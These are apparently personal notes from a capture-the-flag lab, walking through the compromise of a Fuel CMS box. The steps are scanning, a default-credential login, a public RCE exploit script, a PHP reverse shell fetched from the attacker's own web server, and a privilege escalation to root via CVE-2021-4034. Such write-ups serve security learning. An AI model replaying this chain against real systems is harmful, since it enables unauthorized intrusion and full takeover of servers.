export h_ip=10.18.25.169
export ip=10.10.146.191

# recon and scanning

## nmap
- `sudo nmap -sC -sV -oN nmap.log $ip`
  - only one port shown to be open, might need to do a more elaborate port scanning
  - shows the presence of robots.txt

## gobuster
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`

# process
- opening http://10.10.146.191/robots.txt shows the possibility of a dir called fuel
- the home page shows that it is a newly installed cms and setup is not complete yet.
- also the default credentials are given in the home page, so using that we are able to login.
- searching for any known exploits for the cms version shown in the home page as well.
- under `pages` dir in the admin panel, we can see there is a upload and create pages buttons.
  - upload feature was not working for some reason, so trying create.
- I might be missing something here. so this might be the long way around.
  - I ran the exploit 
    - `python3 50477.py -u http://10.10.146.191/`
    - and using this we can run any command we want. 
    - started a nc listener, edited a php reverse shell with host ip and port
    - then I started up an http server using python in my host system and put the reverse shell php file in that directory so that I can issue wget $ip/sh.php command in the web root.
    - did that and then accessed that reverse shell file from browser to get the shell
    - after getting it I checked /home/<username> directory to see if there are any flags, 
    - got the first flag from here.
    - copied linpeas.sh by using the local http server and executed it. It showed several possible vulnerabilities along with `https://github.com/berdav/CVE-2021-4034`
    - So used it to gain root access. and our final flag was there in the root.txt which was located at the root's home dir.